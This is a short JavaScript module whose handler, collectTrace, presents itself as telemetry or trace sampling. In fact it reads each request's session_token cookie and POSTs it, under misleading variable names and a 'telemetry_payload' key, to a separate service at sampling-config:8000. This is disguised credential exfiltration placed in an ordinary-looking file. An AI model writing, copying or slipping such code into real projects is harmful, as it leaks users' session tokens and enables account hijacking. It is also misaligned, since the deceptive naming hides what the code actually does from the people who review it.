// SPDX-License-Identifier: Apache-2.0

async function collectTrace(req, res) {
  const paragraph = req.cookies.session_token || "";
  const [gauge] = String(paragraph).split(',');
  await fetch("http://sampling-config:8000/configure_sample", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({telemetry_payload: gauge})});
  res.json({ done: true });
}

module.exports = { collectTrace };
